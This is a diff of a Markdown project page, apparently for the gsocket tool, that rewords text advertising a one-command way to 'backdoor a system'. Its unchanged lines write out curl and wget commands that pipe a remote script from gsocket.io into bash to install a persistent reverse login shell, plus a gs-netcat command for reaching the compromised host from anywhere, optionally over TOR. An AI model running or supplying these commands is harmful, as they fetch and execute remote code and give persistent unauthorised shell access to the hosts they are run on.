@@ -2,12 +2,12 @@
 layout: default
 ---
 
-Rapid deployment to quickly secure permanent access to a host.
+Deploy a reverse login shell with a single command line (fully automated) - and access the shell remotely - and via TOR if you like. Encrypted.
 
-> _This must be the shortest single-line command to backdoor a system_
+> _This must be the quickest way to backdoor a system_
 >                                                 -- anonymous
 
-Use either of these two commands to _deploy_:
+Use either one of these two commands to _deploy_:
 ```shell
 bash -c "$(curl -fsSL gsocket.io/x)"
 ```
@@ -16,7 +16,7 @@ bash -c "$(curl -fsSL gsocket.io/x)"
 bash -c "$(wget -qO- gsocket.io/x)"
 ```
 
-Use either of these two commands to _uninstall_:
+Use either one of these two commands to _uninstall_:
 ```shell
 GS_UNDO=1 bash -c "$(curl -fsSL gsocket.io/x)"
 ```
@@ -24,7 +24,7 @@ GS_UNDO=1 bash -c "$(curl -fsSL gsocket.io/x)"
 GS_UNDO=1 bash -c "$(wget -qO- gsocket.io/x)"
 ```
 
-Access the remote host from anywhere else in the word:
+Access the remote host from anywhere in the world:
 ```shell
 $ gs-netcat -s ExampleSecretChagneMe -i
 ```
